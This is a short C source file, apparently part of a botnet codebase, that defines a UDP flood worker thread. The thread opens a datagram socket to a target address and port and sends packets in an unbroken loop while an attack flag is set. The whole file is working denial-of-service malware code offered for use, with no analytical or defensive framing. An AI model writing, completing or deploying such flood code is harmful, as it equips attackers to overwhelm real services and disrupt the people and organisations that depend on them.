#include "../../include/botnet.h"

void *udp_flood_worker(void *args) {
    struct target *target = (struct target *)args;
    int sock;
    struct sockaddr_in dest_addr;
    char packet[1024]; // A small packet is enough

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = target->port;
    dest_addr.sin_addr.s_addr = target->addr;

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket");
        return NULL;
    }

    while (attack_running) {
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    }

    close(sock);
    return NULL;
}
